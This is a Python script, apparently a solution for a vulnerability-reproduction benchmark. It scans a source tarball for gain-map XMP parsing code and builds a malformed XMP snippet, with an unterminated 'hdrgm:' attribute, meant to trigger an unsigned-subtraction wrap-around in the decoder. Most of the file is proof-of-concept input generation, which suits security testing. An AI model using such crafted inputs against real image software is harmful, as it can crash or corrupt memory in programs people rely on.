import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source tarball and search for decodeGainmapMetadata usage and hdrgm-related tokens
        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    def is_within_directory(directory, target):
                        
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                    
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        
                        return prefix == abs_directory
                    
                    def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    
                        for member in tar.getmembers():
                            member_path = os.path.join(path, member.name)
                            if not is_within_directory(path, member_path):
                                raise Exception("Attempted Path Traversal in Tar File")
                    
                        tar.extractall(path, members, numeric_owner=numeric_owner) 
                    
                    
                    safe_extract(tf, tmpdir)
            except Exception:
                # If extraction fails, proceed with defaults
                pass

            hdrgm_tokens = []
            decode_files = []

            # Collect potential tokens from code
            for root, _, files in os.walk(tmpdir):
                for fname in files:
                    if not fname.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.inc')):
                        continue
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            txt = f.read()
                    except Exception:
                        continue

                    if 'decodeGainmapMetadata' in txt or 'DecodeGainmapMetadata' in txt:
                        decode_files.append(fpath)

                    # Extract tokens like "hdrgm:Version", "hdrgm:GainMapMin", etc., from string literals
                    for m in re.finditer(r'"(hdrgm:[^"<> \t\r\n]+)"', txt):
                        token = m.group(1)
                        if token not in hdrgm_tokens:
                            hdrgm_tokens.append(token)

            # If we didn't find decode files or tokens, fall back to defaults
            default_tokens = [
                'hdrgm:Version',
                'hdrgm:VersionMajor',
                'hdrgm:VersionMinor',
                'hdrgm:GainMapMin',
                'hdrgm:GainMapMax',
                'hdrgm:Gamma',
                'hdrgm:OffsetSdr',
                'hdrgm:OffsetHdr',
                'hdrgm:HDRCapacityMin',
                'hdrgm:HDRCapacityMax',
            ]
            if not hdrgm_tokens:
                hdrgm_tokens = default_tokens

            # Pick two tokens: one well-formed, one malformed (missing closing quote) to trigger wrap-around
            t1 = hdrgm_tokens[0] if hdrgm_tokens else 'hdrgm:Version'
            t2 = hdrgm_tokens[1] if len(hdrgm_tokens) > 1 else 'hdrgm:GainMapMin'

            # Construct minimal XMP-like snippet. The second attribute intentionally lacks a closing quote.
            # This aims to trigger code paths that search for the terminating quote and compute an unsigned subtraction.
            xmp = (
                '<x:xmpmeta xmlns:x="adobe:ns:meta/">'
                '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
                '<rdf:Description '
                f'{t1}="1" {t2}="'
                ' />'
                '</rdf:RDF>'
                '</x:xmpmeta>'
            )

            return xmp.encode('utf-8', errors='ignore')
        except Exception:
            # As a last resort, return a minimal crafted payload targeting the likely pattern.
            fallback = b'<rdf:Description hdrgm:Version="'
            return fallback
